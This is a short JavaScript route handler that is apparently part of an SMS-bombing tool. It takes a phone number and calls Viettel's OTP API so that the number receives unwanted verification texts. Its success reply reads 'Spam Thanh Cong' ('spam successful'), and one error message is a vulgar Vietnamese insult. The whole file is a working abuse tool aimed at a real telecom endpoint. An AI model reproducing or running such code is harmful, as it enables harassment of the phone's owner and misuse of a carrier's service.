exports.name = '/sms/myviettel';
exports.index = async (req, res, next) => {
  if(!req.query.phone) return res.status(400).jsonp({
    data: 'Co Con Cac'
  })
  const axios = require('axios'),
  data= {
    msisdn: req.query.phone
  };
axios({
  url: 'https://vietteltelecom.vn/api/get-otp',
  method: 'post',
  data
}).then(resp =>{
  console.log(resp.data)
  return res.status(200).jsonp({
    data: 'Spam Thanh Cong'
  })
}).catch(e =>{
  return res.status(400).jsonp({
    data: 'that bai rui'
  })
})
}